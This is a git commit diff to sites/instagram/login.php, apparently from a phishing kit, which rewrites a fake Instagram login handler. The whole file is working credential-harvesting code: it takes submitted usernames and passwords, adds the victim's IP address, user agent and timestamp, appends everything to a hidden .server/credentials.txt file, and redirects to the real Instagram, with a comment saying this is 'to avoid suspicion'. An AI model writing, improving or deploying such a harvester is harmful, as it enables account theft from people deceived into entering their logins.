7c03d0fc6dd933233042ea78674a2434c17b57c2
Voidop09 <voidmajesty@gmail.com>
2025-08-10 22:31:40 +0530

    Update login.php

--- sites/instagram/login.php
+++ sites/instagram/login.php
@@ -1,7 +1,41 @@
 <?php
-file_put_contents("../../.server/credentials.txt", "Instagram Login\n", FILE_APPEND);
-file_put_contents("../../.server/credentials.txt", "Username: " . $_POST['username'] . "\n", FILE_APPEND);
-file_put_contents("../../.server/credentials.txt", "Password: " . $_POST['password'] . "\n\n", FILE_APPEND);
-header('Location: https://instagram.com');
-exit();
+// If the form is submitted
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Get the user credentials from the form
+    $username = isset($_POST["username"]) ? $_POST["username"] : "";
+    $password = isset($_POST["password"]) ? $_POST["password"] : "";
+    
+    // Additional data collection
+    $ip = $_SERVER["REMOTE_ADDR"];
+    $user_agent = $_SERVER["HTTP_USER_AGENT"];
+    $date = date("Y-m-d H:i:s");
+    
+    // Create the log entry
+    $log_entry = "Instagram Credentials\n";
+    $log_entry .= "-------------------------\n";
+    $log_entry .= "Date: $date\n";
+    $log_entry .= "IP Address: $ip\n";
+    $log_entry .= "User Agent: $user_agent\n";
+    $log_entry .= "Username/Email: $username\n";
+    $log_entry .= "Password: $password\n";
+    $log_entry .= "-------------------------\n\n";
+    
+    // Ensure the .server directory exists
+    if (!file_exists("../../.server")) {
+        mkdir("../../.server", 0777, true);
+    }
+    
+    // Save to the credentials file
+    $file = fopen("../../.server/credentials.txt", "a");
+    fwrite($file, $log_entry);
+    fclose($file);
+    
+    // Redirect to the real Instagram to avoid suspicion
+    header("Location: https://www.instagram.com/");
+    exit();
+} else {
+    // If someone tries to access this file directly without POST data
+    header("Location: index.html");
+    exit();
+}
 ?>
